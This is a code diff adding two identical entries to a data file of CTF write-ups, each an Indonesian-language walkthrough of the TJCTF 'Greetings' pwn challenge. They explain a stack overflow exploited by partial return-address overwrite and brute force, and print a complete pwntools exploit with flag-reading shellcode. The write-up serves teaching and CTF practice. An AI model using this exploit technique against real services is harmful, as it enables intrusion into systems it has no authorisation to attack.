@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// TJCSC — 18 writeups
+// Tjcsc — 20 writeups
 export const tjcscWriteups: WriteUp[] = [
   {
     "id": "tjcsc-foren-check-the-fine-print",
@@ -688,6 +688,116 @@ export const tjcscWriteups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "tjctf{s1lv3r_and_g0ld}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "tjcsc-pwn-geetings",
+    "title": "TJCTF - Greetings",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Tjcsc",
+    "tags": [],
+    "description": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
+    "problemDescription": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Recon",
+        "content": "Source yang dikasih:\n\n\n\nHasil penting dari binary:\n\n- 64-bit PIE\n- no canary\n- stack executable\n- overflow ada di `fgets(uname, uname_size, stdin)`\n\nLayout stack dari `greetUser()` kasih offset 72 byte dari awal `uname` ke saved RIP.",
+        "code": "void greetUser() {\n    int uname_size;\n    char uname[64];\n    printf(\"Enter the size of your username: \");\n    scanf(\"%d\", &uname_size);\n    getchar();\n    uname_size += 2;\n    printf(\"Enter username (start with @): \");\n    fgets(uname, uname_size, stdin);\n    if (*(char *) uname == '@') {\n        printf(\"Greetings to you: %s!\", uname);\n    }\n}"
+      },
+      {
+        "title": "Ide awal yang gagal",
+        "content": "Jalur paling natural adalah:\n\n1. isi buffer dengan shellcode\n2. overwrite RIP ke gadget `call rax`\n3. manfaatkan fakta bahwa `fgets()` mengembalikan pointer ke buffer di `rax`\n\nSecara lokal, ini memang jalan kalau ASLR dimatikan. Tapi di service nyata, alamat `call rax` ikut berubah karena PIE+ASLR."
+      },
+      {
+        "title": "Trik yang kepake",
+        "content": "Kunci challenge ini ada di interaksi antara `fgets()` dan saved RIP.\n\nKalau kita minta `fgets()` membaca **73 byte**:\n\n- 72 byte pertama mengisi buffer sampai tepat sebelum RIP\n- byte ke-73 menimpa **byte paling rendah** dari RIP\n- lalu `fgets()` otomatis menulis `\\\\0` sesudahnya, jadi **byte kedua RIP jadi nol**\n\nReturn address normal dari `greetUser()` menuju `main+9`, yang offset rendahnya `...89`. Gadget `call rax` ada di offset `...10`.\n\nJadi kita pakai partial overwrite:\n\n- low byte RIP kita paksa jadi `0x10`\n- byte berikutnya dipaksa jadi `0x00` oleh terminator `fgets`\n\nIni cuma sukses kalau byte kedua alamat return kebetulan memang cocok untuk page yang sama. Probabilitasnya sekitar **1/256** per koneksi. Karena service cepat dan fork-per-connection, brute-force ini sangat masuk akal."
+      },
+      {
+        "title": "Kenapa shellcode-nya harus kecil",
+        "content": "Karena partial overwrite ini cuma ngasih ruang **72 byte** sebelum RIP, shellcode harus muat penuh di situ. Shellcode yang saya pakai:\n\n- tidak spawn shell\n- langsung `open(\"/flag.txt\")`\n- `read()` isinya\n- `write(1, ...)`\n- `exit()`\n\nSaya tambahkan `add rsp, 0x200` di awal supaya buffer baca hasil file tidak menimpa shellcode di stack."
+      },
+      {
+        "title": "Payload final",
+        "content": "Strukturnya:\n\n1. shellcode 61 byte\n2. NOP padding sampai total 72 byte\n3. satu byte `0x10` untuk overwrite low byte RIP\n\nKarena `fgets()` otomatis nulis null byte setelah itu, saved RIP berubah menjadi gadget `call rax` saat kondisi ASLR-nya pas, lalu execution lompat ke shellcode kita karena `rax` masih berisi pointer ke `uname`."
+      },
+      {
+        "title": "Hasil",
+        "content": "Exploit berhasil dengan brute-force cepat dan flag yang keluar:\n\n`tjctf{rAx_h01ds_r3t_v@lS?_189278}`"
+      },
+      {
+        "title": "File",
+        "content": "- `exploit.py` berisi exploit otomatis untuk remote\n\nJalankan:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 exploit.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\n\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"error\"\r\n\r\n\r\nSHELLCODE = asm(\r\n    r\"\"\"\r\n    add rsp, 0x200\r\n    lea rdi, [rip + path]\r\n    xor esi, esi\r\n    xor edx, edx\r\n    mov eax, 2\r\n    syscall\r\n\r\n    mov edi, eax\r\n    mov rsi, rsp\r\n    mov dl, 0x40\r\n    xor eax, eax\r\n    syscall\r\n\r\n    mov edx, eax\r\n    mov dil, 1\r\n    mov al, 1\r\n    syscall\r\n\r\n    mov al, 60\r\n    xor edi, edi\r\n    syscall\r\n\r\npath:\r\n    .asciz \"/flag.txt\"\r\n\"\"\"\r\n)\r\n\r\n\r\nPAYLOAD = SHELLCODE.ljust(72, b\"\\x90\") + b\"\\x10\"\r\n\r\n\r\ndef attack(host: str, port: int, attempts: int) -> bytes | None:\r\n    for i in range(1, attempts + 1):\r\n        p = None\r\n        try:\r\n            p = remote(host, port, timeout=2)\r\n            p.sendlineafter(b\"Enter the size of your username: \", b\"72\")\r\n            p.sendafter(b\"Enter username (start with @): \", PAYLOAD)\r\n            data = p.recvrepeat(0.5)\r\n        except Exception:\r\n            data = b\"\"\r\n        finally:\r\n            if p is not None:\r\n                try:\r\n                    p.close()\r\n                except Exception:\r\n                    pass\r\n\r\n        if b\"tjctf{\" in data:\r\n            print(f\"[+] Success on attempt {i}\")\r\n            print(data.decode(\"latin-1\", errors=\"ignore\"))\r\n            return data\r\n\r\n        if i % 100 == 0:\r\n            print(f\"[*] Tried {i} times\")\r\n\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"tjc.tf\")\r\n    parser.add_argument(\"--port\", type=int, default=31373)\r\n    parser.add_argument(\"--attempts\", type=int, default=5000)\r\n    args = parser.parse_args()\r\n\r\n    result = attack(args.host, args.port, args.attempts)\r\n    return 0 if result else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "tjctf{rAx_h01ds_r3t_v@lS?_189278}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "tjcsc-pwn-geetings-bin",
+    "title": "TJCTF - Greetings",
+    "category": "Pwn",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Tjcsc",
+    "tags": [],
+    "description": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
+    "problemDescription": "Challenge ini kelihatannya simpel: ada `fgets()` ke buffer 64 byte, size input juga dikontrol user, canary tidak ada, dan stack executable. Awalnya keliatan seperti ret2shellcode biasa. Masalahnya ternyata binary PIE dan service jalan dengan ASLR aktif, jadi overwrite RIP penuh ke alamat `call rax` tidak stabil.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Recon",
+        "content": "Source yang dikasih:\n\n\n\nHasil penting dari binary:\n\n- 64-bit PIE\n- no canary\n- stack executable\n- overflow ada di `fgets(uname, uname_size, stdin)`\n\nLayout stack dari `greetUser()` kasih offset 72 byte dari awal `uname` ke saved RIP.",
+        "code": "void greetUser() {\n    int uname_size;\n    char uname[64];\n    printf(\"Enter the size of your username: \");\n    scanf(\"%d\", &uname_size);\n    getchar();\n    uname_size += 2;\n    printf(\"Enter username (start with @): \");\n    fgets(uname, uname_size, stdin);\n    if (*(char *) uname == '@') {\n        printf(\"Greetings to you: %s!\", uname);\n    }\n}"
+      },
+      {
+        "title": "Ide awal yang gagal",
+        "content": "Jalur paling natural adalah:\n\n1. isi buffer dengan shellcode\n2. overwrite RIP ke gadget `call rax`\n3. manfaatkan fakta bahwa `fgets()` mengembalikan pointer ke buffer di `rax`\n\nSecara lokal, ini memang jalan kalau ASLR dimatikan. Tapi di service nyata, alamat `call rax` ikut berubah karena PIE+ASLR."
+      },
+      {
+        "title": "Trik yang kepake",
+        "content": "Kunci challenge ini ada di interaksi antara `fgets()` dan saved RIP.\n\nKalau kita minta `fgets()` membaca **73 byte**:\n\n- 72 byte pertama mengisi buffer sampai tepat sebelum RIP\n- byte ke-73 menimpa **byte paling rendah** dari RIP\n- lalu `fgets()` otomatis menulis `\\\\0` sesudahnya, jadi **byte kedua RIP jadi nol**\n\nReturn address normal dari `greetUser()` menuju `main+9`, yang offset rendahnya `...89`. Gadget `call rax` ada di offset `...10`.\n\nJadi kita pakai partial overwrite:\n\n- low byte RIP kita paksa jadi `0x10`\n- byte berikutnya dipaksa jadi `0x00` oleh terminator `fgets`\n\nIni cuma sukses kalau byte kedua alamat return kebetulan memang cocok untuk page yang sama. Probabilitasnya sekitar **1/256** per koneksi. Karena service cepat dan fork-per-connection, brute-force ini sangat masuk akal."
+      },
+      {
+        "title": "Kenapa shellcode-nya harus kecil",
+        "content": "Karena partial overwrite ini cuma ngasih ruang **72 byte** sebelum RIP, shellcode harus muat penuh di situ. Shellcode yang saya pakai:\n\n- tidak spawn shell\n- langsung `open(\"/flag.txt\")`\n- `read()` isinya\n- `write(1, ...)`\n- `exit()`\n\nSaya tambahkan `add rsp, 0x200` di awal supaya buffer baca hasil file tidak menimpa shellcode di stack."
+      },
+      {
+        "title": "Payload final",
+        "content": "Strukturnya:\n\n1. shellcode 61 byte\n2. NOP padding sampai total 72 byte\n3. satu byte `0x10` untuk overwrite low byte RIP\n\nKarena `fgets()` otomatis nulis null byte setelah itu, saved RIP berubah menjadi gadget `call rax` saat kondisi ASLR-nya pas, lalu execution lompat ke shellcode kita karena `rax` masih berisi pointer ke `uname`."
+      },
+      {
+        "title": "Hasil",
+        "content": "Exploit berhasil dengan brute-force cepat dan flag yang keluar:\n\n`tjctf{rAx_h01ds_r3t_v@lS?_189278}`"
+      },
+      {
+        "title": "File",
+        "content": "- `exploit.py` berisi exploit otomatis untuk remote\n\nJalankan:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 exploit.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (exploit.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport argparse\r\n\r\n\r\ncontext.arch = \"amd64\"\r\ncontext.log_level = \"error\"\r\n\r\n\r\nSHELLCODE = asm(\r\n    r\"\"\"\r\n    add rsp, 0x200\r\n    lea rdi, [rip + path]\r\n    xor esi, esi\r\n    xor edx, edx\r\n    mov eax, 2\r\n    syscall\r\n\r\n    mov edi, eax\r\n    mov rsi, rsp\r\n    mov dl, 0x40\r\n    xor eax, eax\r\n    syscall\r\n\r\n    mov edx, eax\r\n    mov dil, 1\r\n    mov al, 1\r\n    syscall\r\n\r\n    mov al, 60\r\n    xor edi, edi\r\n    syscall\r\n\r\npath:\r\n    .asciz \"/flag.txt\"\r\n\"\"\"\r\n)\r\n\r\n\r\nPAYLOAD = SHELLCODE.ljust(72, b\"\\x90\") + b\"\\x10\"\r\n\r\n\r\ndef attack(host: str, port: int, attempts: int) -> bytes | None:\r\n    for i in range(1, attempts + 1):\r\n        p = None\r\n        try:\r\n            p = remote(host, port, timeout=2)\r\n            p.sendlineafter(b\"Enter the size of your username: \", b\"72\")\r\n            p.sendafter(b\"Enter username (start with @): \", PAYLOAD)\r\n            data = p.recvrepeat(0.5)\r\n        except Exception:\r\n            data = b\"\"\r\n        finally:\r\n            if p is not None:\r\n                try:\r\n                    p.close()\r\n                except Exception:\r\n                    pass\r\n\r\n        if b\"tjctf{\" in data:\r\n            print(f\"[+] Success on attempt {i}\")\r\n            print(data.decode(\"latin-1\", errors=\"ignore\"))\r\n            return data\r\n\r\n        if i % 100 == 0:\r\n            print(f\"[*] Tried {i} times\")\r\n\r\n    return None\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser()\r\n    parser.add_argument(\"--host\", default=\"tjc.tf\")\r\n    parser.add_argument(\"--port\", type=int, default=31373)\r\n    parser.add_argument(\"--attempts\", type=int, default=5000)\r\n    args = parser.parse_args()\r\n\r\n    result = attack(args.host, args.port, args.attempts)\r\n    return 0 if result else 1\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "tjctf{rAx_h01ds_r3t_v@lS?_189278}",
     "lessonsLearned": ""
   }
 ];
